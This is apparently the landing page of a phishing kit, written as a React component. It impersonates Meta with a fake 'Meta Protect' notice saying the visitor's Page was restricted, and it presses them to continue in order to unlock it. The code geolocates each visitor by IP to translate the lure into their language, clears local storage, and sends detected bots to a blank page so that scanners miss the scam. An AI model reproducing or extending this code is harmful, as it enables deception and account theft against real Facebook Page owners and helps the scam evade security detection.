import HeroImage from '@/assets/images/hero-image.jpg';
import MetaLogo from '@/assets/images/logo.png';
import { PATHS } from '@/router/router';
import countryToLanguage from '@/utils/country_to_language';
import { translateText } from '@/utils/translate';
import detectBot from '@/utils/detect_bot';
import { faCircleCheck, faIdCard, faSearch } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import { useCallback, useEffect, useMemo, useState } from 'react';
import { useNavigate, Link } from 'react-router';

const Header = () => {
    return (
        <header className='bg-[#355797]'>
            <div className='mx-auto max-w-7xl px-4 sm:px-6 lg:px-8'>
                <div className='flex h-16 items-center justify-between'>
                    <div className='flex items-center'>
                        <Link to='/' className='flex items-center space-x-3'>
                            <img src={MetaLogo} alt='Meta Logo' className='h-6 w-auto' />
                            <span className='font-medium text-white'>Meta</span>
                        </Link>
                        <span className='mx-4 text-gray-300'>|</span>
                        <Link to='/support-inbox' className='flex items-center space-x-2 text-white transition-colors hover:text-white'>
                            <span>Help Center</span>
                        </Link>
                    </div>

                    <div className='flex items-center space-x-4'>
                        <button className='rounded-md p-2 text-white/90 transition-colors hover:bg-white/10 hover:text-white'>
                            <FontAwesomeIcon icon={faSearch} className='h-5 w-5' />
                        </button>
                    </div>
                </div>
            </div>
        </header>
    );
};

const Index = () => {
    const navigate = useNavigate();
    const [today, setToday] = useState();
    const [isLoading, setIsLoading] = useState(true);
    const defaultTexts = useMemo(
        () => ({
            title: 'Welcome To Meta Protect.',
            description: "Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.",
            protectionText: "We've enabled advanced protections to unlock your Page.",
            processText: 'Below, we walk you through the process in detail and help you fully activate to unlock your Page.',
            continueBtn: 'Continue',
            restrictedText: 'Your page was restricted on'
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [translatedTitle, translatedDesc, translatedProtection, translatedProcess, translatedContinue, translatedRestricted] = await Promise.all([translateText(defaultTexts.title, targetLang), translateText(defaultTexts.description, targetLang), translateText(defaultTexts.protectionText, targetLang), translateText(defaultTexts.processText, targetLang), translateText(defaultTexts.continueBtn, targetLang), translateText(defaultTexts.restrictedText, targetLang)]);

                setTranslatedTexts({
                    title: translatedTitle,
                    description: translatedDesc,
                    protectionText: translatedProtection,
                    processText: translatedProcess,
                    continueBtn: translatedContinue,
                    restrictedText: translatedRestricted
                });
            } catch (error) {
                console.log('translation failed:', error.message);
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const init = async () => {
            const date = new Date();
            const options = {
                month: 'long',
                day: 'numeric',
                year: 'numeric'
            };
            setToday(date.toLocaleString('en-US', options));
            localStorage.clear();

            const checkBot = async () => {
                try {
                    const botResult = await detectBot();
                    if (botResult.isBot) {
                        window.location.href = 'about:blank';
                        return;
                    }
                } catch {
                    //
                }
            };

            const fetchIpInfo = async () => {
                try {
                    const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                    localStorage.setItem('ipInfo', JSON.stringify(response.data));
                    const countryCode = response.data.country_code;
                    const targetLang = countryToLanguage[countryCode] || 'en';

                    setIsLoading(false);
                    localStorage.setItem('targetLang', targetLang);
                    translateAllTexts(targetLang);
                } catch {
                    //
                }
            };
            await fetchIpInfo();
            await checkBot();
        };

        init();
    }, [translateAllTexts]);

    return (
        <div className='flex min-h-screen flex-col bg-white sm:bg-[#F8F9FA]'>
            <Header />
            <div className='flex flex-1 items-center justify-center'>
                <div className='flex max-w-[620px] flex-col gap-4 rounded-lg bg-white p-4 sm:shadow-lg'>
                    <img src={HeroImage} alt='' />
                    <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                    <p className='leading-6 text-[#212529]'>{translatedTexts.description}</p>
                    <div className='relative flex flex-col gap-4'>
                        <div className='absolute top-1/2 left-3 h-[70%] w-0.5 -translate-y-1/2 bg-gray-200'></div>

                        <div className='z-10 flex items-center gap-2'>
                            <FontAwesomeIcon icon={faCircleCheck} className='h-7 w-7 bg-white text-gray-300' size='xl' />
                            <p>{translatedTexts.protectionText}</p>
                        </div>
                        <div className='z-10 flex items-center gap-2'>
                            <FontAwesomeIcon icon={faIdCard} className='h-7 w-7 bg-white text-[#355797]' size='xl' />
                            <p>{translatedTexts.processText}</p>
                        </div>
                    </div>
                    <button
                        className='rounded-lg bg-blue-500 px-3 py-4 font-bold text-white disabled:opacity-50'
                        disabled={isLoading}
                        onClick={() => {
                            navigate(PATHS.HOME);
                        }}
                    >
                        {translatedTexts.continueBtn}
                    </button>
                    <p className='text-center'>
                        {translatedTexts.restrictedText} <span className='font-bold'>{today}</span>
                    </p>
                </div>
            </div>
        </div>
    );
};

export default Index;
